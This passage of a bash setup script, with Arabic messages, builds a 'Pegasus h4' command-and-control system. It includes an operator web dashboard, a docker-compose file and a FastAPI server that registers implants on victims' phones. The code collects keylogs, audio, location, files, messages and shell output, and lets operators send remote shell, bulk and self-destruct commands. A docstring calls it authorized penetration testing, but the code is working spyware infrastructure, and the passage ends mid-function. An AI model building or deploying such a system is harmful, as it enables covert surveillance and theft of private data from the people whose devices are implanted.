        <span style="font-size:20px;font-weight:600">${imp.device_name || 'Unknown'}</span>
        <span class="badge badge-${imp.status}"><span class="badge-dot"></span>${imp.status}</span>
      </div>
      
      <div class="tabs">
        <div class="tab ${state.tab === 'overview' ? 'active' : ''}" onclick="state.tab='overview';render()">نظرة عامة</div>
        <div class="tab ${state.tab === 'telemetry' ? 'active' : ''}" onclick="state.tab='telemetry';render()">القياس عن بعد</div>
        <div class="tab ${state.tab === 'data' ? 'active' : ''}" onclick="state.tab='data';renderImplantData('${imp.id}')">البيانات</div>
        <div class="tab ${state.tab === 'commands' ? 'active' : ''}" onclick="state.tab='commands';render()">الأوامر</div>
      </div>
      
      <div id="tabContent"></div>
    </div>
  `;
  
  const tabContent = document.getElementById('tabContent');
  
  switch (state.tab) {
    case 'overview':
      tabContent.innerHTML = `
        <div class="detail-grid">
          <div class="detail-card">
            <h3>معلومات الجهاز</h3>
            <div class="detail-row"><span class="detail-label">المعرف</span><span class="detail-value">${imp.id}</span></div>
            <div class="detail-row"><span class="detail-label">المنصة</span><span class="detail-value">${imp.platform} ${imp.os_version}</span></div>
            <div class="detail-row"><span class="detail-label">آخر اتصال</span><span class="detail-value">${imp.last_seen ? new Date(imp.last_seen).toLocaleString() : '—'}</span></div>
            <div class="detail-row"><span class="detail-label">IP</span><span class="detail-value">${imp.external_ip || '—'}</span></div>
            <div class="detail-row"><span class="detail-label">البلد</span><span class="detail-value">${imp.country || '—'}</span></div>
            <div class="detail-row"><span class="detail-label">الشبكة</span><span class="detail-value">${imp.carrier || '—'}</span></div>
          </div>
          <div class="detail-card">
            <h3>الحالة</h3>
            <div class="detail-row"><span class="detail-label">البطارية</span><span class="detail-value">${imp.battery_level || '—'}%</span></div>
            <div class="detail-row"><span class="detail-label">التجوال</span><span class="detail-value">${imp.is_roaming ? 'نعم' : 'لا'}</span></div>
            <div class="detail-row"><span class="detail-label">الوحدات المثبتة</span><span class="detail-value">${(imp.modules || []).join(', ') || '—'}</span></div>
            <div class="detail-row"><span class="detail-label">الوسوم</span><span class="detail-value">${(imp.tags || []).join(', ') || '—'}</span></div>
          </div>
        </div>
        
        <div class="detail-card" style="margin-top:16px">
          <h3>الوحدات النشطة</h3>
          <div class="module-grid">
            <div class="module-card"><div class="module-icon">🎤</div><div class="module-name">Audio</div><div class="module-status module-active">نشط</div></div>
            <div class="module-card"><div class="module-icon">⌨️</div><div class="module-name">Keylogger</div><div class="module-status module-active">نشط</div></div>
            <div class="module-card"><div class="module-icon">📍</div><div class="module-name">Location</div><div class="module-status module-active">نشط</div></div>
            <div class="module-card"><div class="module-icon">📁</div><div class="module-name">Files</div><div class="module-status module-active">نشط</div></div>
            <div class="module-card"><div class="module-icon">📸</div><div class="module-name">Screenshots</div><div class="module-status module-inactive">متوقف</div></div>
            <div class="module-card"><div class="module-icon">💬</div><div class="module-name">Messages</div><div class="module-status module-active">نشط</div></div>
          </div>
        </div>
      `;
      break;
      
    case 'telemetry':
      tabContent.innerHTML = `
        <div class="detail-card">
          <h3>القياس عن بعد (آخر ${telemetry.length} قراءة)</h3>
          ${telemetry.length === 0 
            ? '<div class="empty-state">لا توجد بيانات قياس عن بعد</div>'
            : telemetry.map(t => `
              <div class="detail-row">
                <span class="detail-label">${new Date(t.timestamp * 1000).toLocaleString()}</span>
                <span class="detail-value">بطارية: ${t.battery_level}% | إشارة: ${t.signal_strength} | CPU: ${(t.cpu_usage || 0).toFixed(1)}% | ${t.location ? `${t.location.lat.toFixed(4)}, ${t.location.lon.toFixed(4)}` : 'لا موقع'}</span>
              </div>
            `).join('')
          }
        </div>
      `;
      break;
      
    case 'commands':
      tabContent.innerHTML = `
        <div class="detail-card">
          <h3>إرسال أمر</h3>
          <div class="cmd-builder">
            <div class="cmd-row">
              <select id="cmdType">
                <option value="collect_now">جمع بيانات</option>
                <option value="exec_module">تشغيل وحدة</option>
                <option value="update_config">تحديث الإعدادات</option>
                <option value="exec_shell">أمر شيل</option>
                <option value="self_destruct">تدمير ذاتي</option>
              </select>
              <input type="text" id="cmdPayload" placeholder="JSON payload (اختياري)">
              <button class="btn btn-primary" onclick="sendCmd('${imp.id}')">إرسال</button>
            </div>
          </div>
        </div>
      `;
      break;
  }
}

async function renderImplantData(implantId) {
  try {
    const res = await API.getData({ implant_id: implantId, limit: 50 });
    state._dataItems = res?.data || [];
  } catch {}
  
  const tabContent = document.getElementById('tabContent');
  if (!tabContent) return;
  
  const items = state._dataItems || [];
  tabContent.innerHTML = `
    <div class="detail-card">
      <h3>البيانات المجمعة (${items.length})</h3>
      ${items.length === 0
        ? '<div class="empty-state">لا توجد بيانات بعد</div>'
        : items.map(d => `
          <div class="detail-row">
            <span class="detail-label">${d.type}${d.sub_type ? '/' + d.sub_type : ''}</span>
            <span class="detail-value">${new Date(d.timestamp).toLocaleString()} | ${formatBytes(d.size)} | ${d.checksum?.slice(0, 8)}</span>
          </div>
        `).join('')
      }
    </div>
  `;
}

async function sendCmd(implantId) {
  const type = document.getElementById('cmdType')?.value;
  const payloadStr = document.getElementById('cmdPayload')?.value;
  let payload = {};
  if (payloadStr) {
    try { payload = JSON.parse(payloadStr); } catch { payload = { args: payloadStr }; }
  }
  try {
    await API.sendCommand([implantId], type, payload);
    showToast('تم إرسال الأمر', 'success');
  } catch (e) {
    showToast('فشل: ' + e.message, 'error');
  }
}

function renderDataView(app) {
  const items = state._dataItems || [];
  
  app.innerHTML = `
    ${renderHeader()}
    <div class="container">
      <div class="table-card">
        <div class="chart-title">جميع البيانات المجمعة</div>
        <div class="table-toolbar">
          <input type="text" class="search-input" placeholder="بحث..." id="dataSearch">
          <select class="filter-select" id="dataTypeFilter">
            <option value="">كل الأنواع</option>
            <option value="audio">Audio</option>
            <option value="keylog">Keylog</option>
            <option value="location">Location</option>
            <option value="file">File</option>
            <option value="screenshot">Screenshot</option>
            <option value="message">Message</option>
            <option value="shell_output">Shell</option>
          </select>
          <button class="btn btn-primary" onclick="API.getData({limit:100}).then(r=>{state._dataItems=r.data;render()})">تحديث</button>
        </div>
        ${items.length === 0
          ? '<div class="empty-state">لا توجد بيانات. انتظر حتى تبدأ الزرعات بإرسال البيانات.</div>'
          : `<table><thead><tr>
            <th>النوع</th><th>النوع الفرعي</th><th>الوقت</th><th>الحجم</th><th>الزرعة</th><th>التشفير</th>
          </tr></thead><tbody>
          ${items.map(d => `
            <tr>
              <td><span class="badge badge-online">${d.type}</span></td>
              <td style="color:var(--text2)">${d.sub_type || '—'}</td>
              <td style="color:var(--text2);font-size:12px">${new Date(d.timestamp).toLocaleString()}</td>
              <td style="font-family:monospace;font-size:12px">${formatBytes(d.size)}</td>
              <td style="color:var(--text2);font-size:11px;font-family:monospace">${d.implant_id?.slice(0,8)}</td>
              <td>${d.encrypted ? '🔒' : '🔓'}</td>
            </tr>
          `).join('')}
          </tbody></table>`
        }
      </div>
    </div>
  `;
}

function renderMapView(app) {
  app.innerHTML = `
    ${renderHeader()}
    <div class="container">
      <div class="map-container" style="height:600px">
        <div class="chart-title">خريطة جميع الزرعات</div>
        <div id="map-canvas-full"></div>
      </div>
    </div>
  `;
  
  const canvas = document.getElementById('map-canvas-full');
  if (state.mapPoints.length === 0) {
    canvas.innerHTML = '<div class="empty-state" style="padding:120px 0">لا توجد مواقع متاحة</div>';
  } else {
    renderMapOnCanvas(state.mapPoints);
  }
}

function renderCommandsView(app) {
  app.innerHTML = `
    ${renderHeader()}
    <div class="container">
      <div class="detail-grid">
        <div class="detail-card">
          <h3>إرسال أمر جماعي</h3>
          <div class="cmd-builder">
            <div class="cmd-row">
              <select id="bulkCmdType">
                <option value="collect_now">جمع بيانات (كل الوحدات)</option>
                <option value="exec_module">تشغيل وحدة</option>
                <option value="update_config">تحديث الإعدادات</option>
                <option value="self_destruct">تدمير ذاتي (جميع الزرعات)</option>
              </select>
            </div>
            <div class="cmd-row">
              <input type="text" id="bulkCmdPayload" placeholder="JSON payload" style="flex:1">
              <button class="btn btn-primary" onclick="sendBulkCommand()">إرسال للكل</button>
            </div>
          </div>
        </div>
        <div class="detail-card">
          <h3>أوامر معلقة</h3>
          <div id="pendingCommands">
            <div class="empty-state">جاري التحميل...</div>
          </div>
        </div>
      </div>
    </div>
  `;
  
  // Fetch pending commands
  API.get('/operator/commands?status=pending').then(r => {
    const el = document.getElementById('pendingCommands');
    const cmds = r.commands || [];
    if (cmds.length === 0) {
      el.innerHTML = '<div class="empty-state">لا توجد أوامر معلقة</div>';
    } else {
      el.innerHTML = cmds.map(c => `
        <div class="detail-row">
          <span class="detail-label">${c.type}</span>
          <span class="detail-value" style="font-size:11px">${c.implant_id?.slice(0,8)} | ${new Date(c.created_at).toLocaleString()}</span>
        </div>
      `).join('');
    }
  }).catch(() => {});
}

async function sendBulkCommand() {
  const type = document.getElementById('bulkCmdType')?.value;
  const payloadStr = document.getElementById('bulkCmdPayload')?.value;
  let payload = {};
  if (payloadStr) {
    try { payload = JSON.parse(payloadStr); } catch { payload = { args: payloadStr }; }
  }
  
  // Send to all online implants
  const onlineIds = state.implants.filter(i => i.status === 'online').map(i => i.id);
  if (onlineIds.length === 0) {
    showToast('لا توجد زرعات نشطة', 'error');
    return;
  }
  
  try {
    await API.sendCommand(onlineIds, type, payload);
    showToast(`تم إرسال الأمر إلى ${onlineIds.length} زرعة`, 'success');
  } catch (e) {
    showToast('فشل: ' + e.message, 'error');
  }
}

function logout() {
  localStorage.removeItem('pegasus_token');
  localStorage.removeItem('pegasus_user');
  API.TOKEN = '';
  if (API._ws) API._ws.close();
  render();
}

// ============================================================
// Init
// ============================================================
function init() {
  const savedToken = localStorage.getItem('pegasus_token');
  if (savedToken) {
    API.TOKEN = savedToken;
    
    // WebSocket connection for real-time updates
    API.connectWS((msg) => {
      if (state.currentView === 'dashboard') {
        // Refresh on new data
        setTimeout(loadView, 1000);
      }
    });
    
    // Load initial view based on URL
    const path = window.location.pathname;
    if (path.startsWith('/implant/')) {
      navigate('implant', { id: path.split('/')[2] });
    } else if (path === '/data') { navigate('data'); }
    else if (path === '/map') { navigate('map'); }
    else if (path === '/commands') { navigate('commands'); }
    else { navigate('dashboard'); }
  } else {
    render();
  }
}

init();
</script>
</body>
</html>
HTMLEOF

ok "تم إنشاء ملف الواجهة: $UI_FILE ($(wc -c < "$UI_FILE") bytes)"

# ============================================================
# 2. Docker Compose
# ============================================================
info "إنشاء Docker Compose..."

cat > "$PROJECT_DIR/docker-compose.yml" << 'DOCKEREOF'
version: '3.8'

services:
  postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: pegasus
      POSTGRES_PASSWORD: ${DB_PASSWORD:-ChangeMePegasusDB2024!}
      POSTGRES_DB: pegasus_h4
    volumes:
      - pgdata:/var/lib/postgresql/data
    networks:
      - pegasus-net
    restart: unless-stopped
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U pegasus"]
      interval: 5s
      timeout: 5s
      retries: 5

  h4-server:
    image: alpine:3.19
    ports:
      - "8443:8443"
      - "9001:9001"
    environment:
      DB_PASSWORD: ${DB_PASSWORD:-ChangeMePegasusDB2024!}
      JWT_SECRET: ${JWT_SECRET:-CHANGE_ME_TO_64_CHARS_RANDOM_STRING}
    volumes:
      - ./server:/opt/pegasus
      - ./certs:/etc/pegasus/certs
      - logs:/var/log/pegasus
    depends_on:
      postgres:
        condition: service_healthy
    networks:
      - pegasus-net
    restart: unless-stopped
    command: >
      sh -c "
      apk add --no-cache python3 py3-pip postgresql-client openssl &&
      pip3 install fastapi uvicorn[standard] psycopg2-binary asyncpg sqlalchemy[asyncio] \
        pyjwt[crypto] cryptography paho-mqtt websockets python-multipart &&
      python3 /opt/pegasus/server.py
      "

  caddy:
    image: caddy:2-alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./Caddyfile:/etc/caddy/Caddyfile
      - ./../pegasus-ui.html:/srv/www/index.html
      - caddy_data:/data
    networks:
      - pegasus-net
    restart: unless-stopped

volumes:
  pgdata:
  logs:
  caddy_data:

networks:
  pegasus-net:
    driver: bridge
DOCKEREOF

ok "تم إنشاء docker-compose.yml"

# ============================================================
# 3. h4 Server Python (FastAPI)
# ============================================================
info "إنشاء خادم h4 بالـ Python..."

mkdir -p "$H4_SERVER_DIR"
mkdir -p "$PROJECT_DIR/certs"

# إنشاء الشهادات
openssl req -x509 -newkey rsa:4096 -keyout "$PROJECT_DIR/certs/server.key" \
  -out "$PROJECT_DIR/certs/server.crt" -days 365 -nodes \
  -subj "/C=US/O=Pegasus/CN=h4.pegasus-infra.net" 2>/dev/null

# أكمل ملف server.py
cat > "$H4_SERVER_DIR/server.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Pegasus h4 Server — FastAPI Implementation
Command & Control server for authorized penetration testing
"""

import asyncio
import json
import os
import uuid
import hashlib
import hmac
import time
from datetime import datetime, timedelta
from typing import Optional, List
from contextlib import asynccontextmanager

import uvicorn
from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
import asyncpg
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

# ============================================================
# Configuration
# ============================================================
DB_PASSWORD = os.getenv("DB_PASSWORD", "ChangeMePegasusDB2024!")
JWT_SECRET = os.getenv("JWT_SECRET", "CHANGE_ME_TO_64_CHARS_RANDOM_STRING")
DB_DSN = f"postgresql://pegasus:{DB_PASSWORD}@postgres:5432/pegasus_h4"
FERNET_KEY = Fernet.generate_key()
cipher = Fernet(FERNET_KEY)

# ============================================================
# Models
# ============================================================
class RegisterRequest(BaseModel):
    device_name: str
    platform: str
    os_version: str
    public_key: str
    modules: List[str] = []

class TelemetryData(BaseModel):
    battery_level: int = -1
    signal_strength: int = -1
    is_roaming: bool = False
    wifi_ssid: str = ""
    cpu_usage: float = 0.0
    memory_usage: float = 0.0
    storage_free: int = 0
    lat: Optional[float] = None
    lon: Optional[float] = None
    accuracy: Optional[float] = None

class DataPayload(BaseModel):
    id: str = ""
    implant_id: str = ""
    type: str
    sub_type: str = ""
    timestamp: int = 0
    data: dict = {}
    size: int = 0
    encrypted: bool = True
    checksum: str = ""

class CommandRequest(BaseModel):
    implant_ids: List[str]
    type: str
    payload: dict = {}

class LoginRequest(BaseModel):
    username: str
    password: str

class CreateUserRequest(BaseModel):
    username: str
    password: str
    role: str = "operator"

# ============================================================
# Database
# ============================================================
class Database:
    def __init__(self):
        self.pool = None

    async def connect(self):
        self.pool = await asyncpg.create_pool(DB_DSN, min_size=5, max_size=20)
        await self.run_migrations()

    async def run_migrations(self):
        async with self.pool.acquire() as conn:
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS implants (
                    id TEXT PRIMARY KEY,
                    device_name TEXT NOT NULL,
                    platform TEXT NOT NULL,
                    os_version TEXT NOT NULL,
                    status TEXT DEFAULT 'offline',
                    public_key TEXT,
                    last_seen TIMESTAMPTZ DEFAULT NOW(),
                    first_seen TIMESTAMPTZ DEFAULT NOW(),
                    external_ip TEXT DEFAULT '',
                    country TEXT DEFAULT '',
                    carrier TEXT DEFAULT '',
                    battery_level INT DEFAULT -1,
                    is_roaming BOOLEAN DEFAULT FALSE,
                    modules TEXT[] DEFAULT '{}',
                    tags TEXT[] DEFAULT '{}'
                );
                CREATE TABLE IF NOT EXISTS telemetry (
                    id BIGSERIAL PRIMARY KEY,
                    implant_id TEXT REFERENCES implants(id),
                    timestamp TIMESTAMPTZ DEFAULT NOW(),
                    battery_level INT DEFAULT -1,
                    signal_strength INT DEFAULT -1,
                    is_roaming BOOLEAN DEFAULT FALSE,
                    wifi_ssid TEXT DEFAULT '',
                    cpu_usage REAL DEFAULT 0.0,
                    memory_usage REAL DEFAULT 0.0,
                    storage_free BIGINT DEFAULT 0,
                    lat REAL, lon REAL, accuracy REAL
                );
                CREATE INDEX IF NOT EXISTS idx_telemetry_implant ON telemetry(implant_id, timestamp DESC);
                CREATE TABLE IF NOT EXISTS payloads (
                    id TEXT PRIMARY KEY,
                    implant_id TEXT REFERENCES implants(id),
                    type TEXT NOT NULL,
                    sub_type TEXT DEFAULT '',
                    timestamp BIGINT NOT NULL,
                    data JSONB,
                    size BIGINT DEFAULT 0,
                    encrypted BOOLEAN DEFAULT TRUE,
                    checksum TEXT DEFAULT ''
                );
                CREATE INDEX IF NOT EXISTS idx_payloads_implant ON payloads(implant_id);
                CREATE INDEX IF NOT EXISTS idx_payloads_type ON payloads(type);
                CREATE TABLE IF NOT EXISTS commands (
                    id TEXT PRIMARY KEY,
                    implant_id TEXT NOT NULL,
                    type TEXT NOT NULL,
                    payload JSONB DEFAULT '{}',
                    status TEXT DEFAULT 'pending',
                    created_at TIMESTAMPTZ DEFAULT NOW(),
                    delivered_at TIMESTAMPTZ,
                    executed_at TIMESTAMPTZ,
                    result TEXT DEFAULT ''
                );
                CREATE INDEX IF NOT EXISTS idx_commands_implant ON commands(implant_id, status);
                CREATE TABLE IF NOT EXISTS users (
                    id TEXT PRIMARY KEY DEFAULT gen_random_uuid()::text,
                    username TEXT UNIQUE NOT NULL,
                    password_hash TEXT NOT NULL,
                    role TEXT DEFAULT 'operator',
                    mfa_enabled BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMPTZ DEFAULT NOW()
                );
                CREATE TABLE IF NOT EXISTS audit_log (
                    id BIGSERIAL PRIMARY KEY,
                    user_id TEXT REFERENCES users(id),
                    action TEXT NOT NULL,
                    target_type TEXT,
                    target_id TEXT,
                    details JSONB,
                    ip_address TEXT,
                    created_at TIMESTAMPTZ DEFAULT NOW()
                );
            """)
            # Create default admin if not exists
            pw_hash = hashlib.sha256(f"admin:{JWT_SECRET}".encode()).hexdigest()
            await conn.execute("""
                INSERT INTO users (username, password_hash, role) 
                VALUES ('admin', $1, 'admin')
                ON CONFLICT (username) DO NOTHING
            """, pw_hash)

    async def register_implant(self, req: RegisterRequest, ip: str) -> dict:
        implant_id = uuid.uuid4().hex[:16]
        async with self.pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO implants (id, device_name, platform, os_version, status, public_key, external_ip, modules)
                VALUES ($1, $2, $3, $4, 'online', $5, $6, $7)
                ON CONFLICT (id) DO UPDATE SET
                    device_name=$2, os_version=$4, status='online', last_seen=NOW(), external_ip=$6
            """, implant_id, req.device_name, req.platform, req.os_version, req.public_key, ip, req.modules)
        return {"implant_id": implant_id, "session_key": "", "heartbeat_period": 60}

    async def get_implant(self, implant_id: str) -> Optional[dict]:
        async with self.pool.acquire() as conn:
            row = await conn.fetchrow("SELECT * FROM implants WHERE id=$1", implant_id)
            if not row: return None
            return dict(row)

    async def list_implants(self, status: str = "") -> List[dict]:
        async with self.pool.acquire() as conn:
            if status:
                rows = await conn.fetch("SELECT * FROM implants WHERE status=$1 ORDER BY last_seen DESC", status)
            else:
                rows = await conn.fetch("SELECT * FROM implants ORDER BY last_seen DESC")
            return [dict(r) for r in rows]

    async def update_telemetry(self, implant_id: str, t: TelemetryData):
        async with self.pool.acquire() as conn:
            await conn.execute("""
                UPDATE implants SET last_seen=NOW(), battery_level=$1, is_roaming=$2, status='online'
                WHERE id=$3
            """, t.battery_level, t.is_roaming, implant_id)
            await conn.execute("""
                INSERT INTO telemetry (implant_id, battery_level, signal_strength, is_roaming, wifi_ssid, cpu_usage, memory_usage, storage_free, lat, lon, accuracy)
                VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)
            """, implant_id, t.battery_level, t.signal_strength, t.is_roaming, t.wifi_ssid,
                t.cpu_usage, t.memory_usage, t.storage_free, t.lat, t.lon, t.accuracy)

    async def store_payload(self, p: DataPayload):
        if not p.id: p.id = uuid.uuid4().hex
        if not p.timestamp: p.timestamp = int(time.time())
        async with self.pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO payloads (id, implant_id, type, sub_type, timestamp, data, size, encrypted, checksum)
                VALUES ($1, $2, $3, $4, $5, $6::jsonb, $7, $8, $9)
                ON CONFLICT (id) DO NOTHING
            """, p.id, p.implant_id, p.type, p.sub_type, p.timestamp,
                json.dumps(p.data), p.size, p.encrypted, p.checksum)

    async def get_payloads(self, implant_id: str = "", type_: str = "", limit: int = 50, offset: int = 0) -> List[dict]:
        async with self.pool.acquire() as conn:
            if implant_id and type_:
                rows = await conn.fetch(
                    "SELECT * FROM payloads WHERE implant_id=$1 AND type=$2 ORDER BY timestamp DESC LIMIT $3 OFFSET $4",
                    implant_id, type_, limit, offset)
            elif implant_id:
                rows = await conn.fetch(
                    "SELECT * FROM payloads WHERE implant_id=$1 ORDER BY timestamp DESC LIMIT $2 OFFSET $3",
                    implant_id, limit, offset)
            elif type_:
                rows = await conn.fetch(
                    "SELECT * FROM payloads WHERE type=$1 ORDER BY timestamp DESC LIMIT $2 OFFSET $3",
                    type_, limit, offset)
            else:
                rows = await conn.fetch(
                    "SELECT * FROM payloads ORDER BY timestamp DESC LIMIT $1 OFFSET $2", limit, offset)
            return [dict(r) for r in rows]

    async def create_command(self, cmd_id: str, implant_id: str, type_: str, payload: dict):
        async with self.pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO commands (id, implant_id, type, payload, status)
                VALUES ($1, $2, $3, $4::jsonb, 'pending')
            """, cmd_id, implant_id, type_, json.dumps(payload))

    async def get_pending_commands(self, implant_id: str) -> List[dict]:
        async with self.pool.acquire() as conn:
            rows = await conn.fetch(
                "SELECT * FROM commands WHERE implant_id=$1 AND status='pending' ORDER BY created_at ASC",
                implant_id)
            if rows:
                await conn.execute(
                    "UPDATE commands SET status='delivered', delivered_at=NOW() WHERE implant_id=$1 AND status='pending'",
                    implant_id)
            return [dict(r) for r in rows]

    async def get_stats(self) -> dict:
        async with self.pool.acquire() as conn:
            total = await conn.fetchval("SELECT COUNT(*) FROM implants")
            online = await conn.fetchval("SELECT COUNT(*) FROM implants WHERE status='online' AND last_seen > NOW() - INTERVAL '15 minutes'")
            new_today = await conn.fetchval("SELECT COUNT(*) FROM implants WHERE first_seen > CURRENT_DATE")
            data_size = await conn.fetchval("SELECT COALESCE(SUM(size), 0) FROM payloads")
            active_cmds = await conn.fetchval("SELECT COUNT(*) FROM commands WHERE status='pending'")
            countries = await conn.fetchval("SELECT COUNT(DISTINCT country) FROM implants WHERE country IS NOT NULL AND country != ''")
            
            type_rows = await conn.fetch("SELECT type, COUNT(*) as cnt FROM payloads GROUP BY type ORDER BY cnt DESC")
            data_by_type = {r['type']: r['cnt'] for r in type_rows}
            
            country_rows = await conn.fetch("SELECT country, COUNT(*) as cnt FROM implants WHERE country IS NOT NULL AND country != '' GROUP BY country ORDER BY cnt DESC LIMIT 5")
            top_countries = [{"country": r['country'], "count": r['cnt']} for r in country_rows]
            
            return {
                "total_implants": total,
                "online_now": online,
                "new_today": new_today,
                "data_collected_bytes": data_size,
                "data_by_type": data_by_type,
                "geographic_spread": countries,
                "top_countries": top_countries,
                "active_commands": active_cmds
            }

    async def get_user(self, username: str) -> Optional[dict]:
        async with self.pool.acquire() as conn:
            row = await conn.fetchrow("SELECT * FROM users WHERE username=$1", username)
            return dict(row) if row else None

    async def create_user(self, username: str, password: str, role: str = "operator"):
        pw_hash = hashlib.sha256(f"{username}:{password}:{JWT_SECRET}".encode()).hexdigest()
        async with self.pool.acquire() as conn:
            await conn.execute(
                "INSERT INTO users (username, password_hash, role) VALUES ($1, $2, $3) ON CONFLICT DO NOTHING",
                username, pw_hash, role)

db = Database()

# ============================================================
# WebSocket Manager
# ============================================================
class ConnectionManager:
    def __init__(self):
        self.active: dict[str, WebSocket] = {}

    async def connect(self, client_id: str, websocket: WebSocket):
        await websocket.accept()
        self.active[client_id] = websocket

    def disconnect(self, client_id: str):
        self.active.pop(client_id, None)

    async def broadcast(self, event: str, data: dict):
        msg = json.dumps({"event": event, "data": data})
        dead = []
        for cid, ws in self.active.items():
            try:
                await ws.send_text(msg)
            except:
                dead.append(cid)
        for cid in dead:
            self.disconnect(cid)

ws_manager = ConnectionManager()

# ============================================================
# JWT Helper
# ============================================================
def create_token(user_id: str, username: str, role: str) -> str:
    payload = {
        "sub": user_id,
        "username": username,
        "role": role,
        "iat": int(time.time()),
        "exp": int(time.time()) + 86400  # 24 hours
    }
    header = json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
    payload_b64 = json.dumps(payload).encode()
    import base64
    h = base64.urlsafe_b64encode(header).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(payload_b64).rstrip(b'=').decode()
    sig = hmac.new(JWT_SECRET.encode(), f"{h}.{p}".encode(), hashlib.sha256).hexdigest()
    return f"{h}.{p}.{sig}"

def verify_token(token: str) -> Optional[dict]:
    import base64
    try:
        parts = token.split('.')
        if len(parts) != 3: return None
        expected_sig = hmac.new(JWT_SECRET.encode(), f"{parts[0]}.{parts[1]}".encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(expected_sig, parts[2]): return None
        payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        if payload.get('exp', 0) < time.time(): return None
        return payload
    except:
        return None

security = HTTPBearer(auto_error=False)

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    if not credentials:
        raise HTTPException(401, "Not authenticated")
    payload = verify_token(credentials.credentials)
    if not payload:
        raise HTTPException(401, "Invalid token")
    return payload

# ============================================================
# FastAPI App
# ============================================================
@asynccontextmanager
async def lifespan(app: FastAPI):
    await db.connect()
    print("[+] Database connected and migrations complete")
    yield
    await db.pool.close()

app = FastAPI(title="Pegasus h4", version="1.0.0", lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True,
                   allow_methods=["*"], allow_headers=["*"])

# ============================================================
# Implant Endpoints
# ============================================================
@app.post("/api/implants/register")
async def register_implant(req: RegisterRequest, x_forwarded_for: Optional[str] = None):
    ip = x_forwarded_for or "0.0.0.0"
    result = await db.register_implant(req, ip)
    return result

@app.post("/api/implants/{implant_id}/telemetry")
async def handle_telemetry(implant_id: str, t: TelemetryData):
    await db.update_telemetry(implant_id, t)
    await ws_manager.broadcast("telemetry", {"implant_id": implant_id, "data": t.dict()})
    return {"status": "ok"}

@app.post("/api/implants/{implant_id}/data")
async def handle_data(implant_id: str, payloads: List[DataPayload]):
    for p in payloads:
        p.implant_id = implant_id
        await db.store_payload(p)
        await ws_manager.broadcast("data", p.dict())
    return {"status": "ok", "count": len(payloads)}

@app.get("/api/implants/{implant_id}/commands")
async def fetch_commands(implant_id: str):
    cmds = await db.get_pending_commands(implant_id)
    return {"commands": cmds}

@app.post("/api/implants/{implant_id}/commands/{cmd_id}/ack")
async def ack_command(implant_id: str, cmd_id: str, body: dict):
    async with db.pool.acquire() as conn:
        await conn.execute(
            "UPDATE commands SET status=$1, executed_at=NOW(), result=$2 WHERE id=$3",
            body.get("status", "executed"), body.get("result", ""), cmd_id)
    return {"status": "ok"}

# ============================================================
# Operator Endpoints (authenticated)
# ============================================================
@app.post("/api/operator/login")
async def login(req: LoginRequest):
    user = await db.get_user(req.username)
    if not user:
        raise HTTPException(401, "Invalid credentials")
    pw_hash = hashlib.sha256(f"{req.username}:{req.password}:{JWT_SECRET}".encode()).hexdigest()
    if pw_hash != user["password_hash"]:
        raise HTTPException(401, "Invalid credentials")
    token = create_token(user["id"], user["username"], user["role"])
    return {
        "token": token,
        "user_id": user["id"],
        "username": user["username"],
        "role": user["role"]
    }

@app.get("/api/operator/dashboard/stats")
async def dashboard_stats(user: dict = Depends(get_current_user)):
    return await db.get_stats()

@app.get("/api/operator/implants")
async def list_implants(status: str = "", user: dict = Depends(get_current_user)):
    implants = await db.list_implants(status)
    return {"implants": implants}

@app.get("/api/operator/implants/{implant_id}")
async def get_implant(implant_id: str, user: dict = Depends(get_current_user)):
    implant = await db.get_implant(implant_id)
    if not implant:
        raise HTTPException(404, "Implant not found")
    # Get recent telemetry
    async with db.pool.acquire() as conn:
        rows = await conn.fetch(
            "SELECT * FROM telemetry WHERE implant_id=$1 ORDER BY timestamp DESC LIMIT 10",
            implant_id)
        telemetry = [dict(r) for r in rows]
    return {"implant": implant, "telemetry": telemetry}

@app.post("/api/operator/commands")
async def send_command(req: CommandRequest, user: dict = Depends(get_current_user)):
    cmd_ids = []
    for implant_id in req.implant_ids:
        cmd_id = uuid.uuid4().hex
        await db.create_command(cmd_id, implant_id, req.type, req.payload)
        cmd_ids.append(cmd_id)
    return {
        "command_id": cmd_ids[0] if cmd_ids else "",
        "implant_ids": req.implant_ids,
        "status": "created"
    }

@app.get("/api/operator/commands")
async def list_commands(implant_id: str = "", status: str = "", user: dict = Depends(get_current_user)):
    async with db.pool.acquire() as conn:
        if implant_id and status:
            rows = await conn.fetch(
                "SELECT * FROM commands WHERE implant_id=$1 AND status=$2 ORDER BY created_at DESC LIMIT 100",
                implant_id, status)
        elif implant_id:
            rows = await conn.fetch(
                "SELECT * FROM commands WHERE implant_id=$1 ORDER BY created_at DESC LIMIT 100",
                implant_id)
        elif status:
            rows = await conn.fetch(
                "SELECT * FROM commands WHERE status=$1 ORDER BY created_at DESC LIMIT 100",
                status)
        else:
            rows = await conn.fetch("SELECT * FROM commands ORDER BY created_at DESC LIMIT 100")
        return {"commands": [dict(r) for r in rows]}

@app.get("/api/operator/data")
async def query_data(
    implant_id: str = "", type: str = "", limit: int = 50, offset: int = 0,
    user: dict = Depends(get_current_user)
):
    payloads = await db.get_payloads(implant_id, type, limit, offset)
    return {"data": payloads, "count": len(payloads)}

@app.get("/api/operator/dashboard/map")
async def map_data(user: dict = Depends(get_current_user)):
    async with db.pool.acquire() as conn:
